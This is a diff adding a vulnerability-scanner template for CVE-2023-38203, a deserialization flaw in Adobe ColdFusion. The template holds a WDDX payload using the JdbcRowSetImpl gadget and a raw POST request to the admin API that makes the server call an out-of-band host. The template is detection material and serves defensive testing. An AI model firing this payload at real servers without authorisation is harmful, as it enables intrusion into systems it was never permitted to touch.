@@ -1,0 +1,50 @@
+id: CVE-2023-38203
+info:
+  name: Adobe ColdFusion Remote Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Adobe ColdFusion is a commercial application server developed by Adobe for web applications. This vulnerability allows an attacker to send malicious serialized data to the ColdFusion server, leading to arbitrary code execution.
+  tags: code-execution
+  reference:
+    - https://helpx.adobe.com/ColdFusion/kb/coldfusion-2023-update-html
+    - https://blog.projectdiscovery.io/adobe-coldfusion-rce/
+  classification:
+    cve-id: CVE-2023-38203
+    cvss-score: 9.8
+
+variables:
+  ldap_payload: |
+    <wddxPacket version='1.0'>
+        <header/>
+        <data>
+            <struct type='xcom.sun.rowset.JdbcRowSetImplx'>
+                <var name='dataSourceName'>
+                    <string>{{interactsh-url}}</string>
+                </var>
+                <var name='autoCommit'>
+                    <boolean value='true'/>
+                </var>
+            </struct>
+        </data>
+    </wddxPacket>
+
+http:
+  - raw:
+      - |
+        POST /CFIDE/adminapi/base.cfc?method HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        argumentCollection={{url_encode(ldap_payload)}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "xcom.sun.rowset.JdbcRowSetImplx"
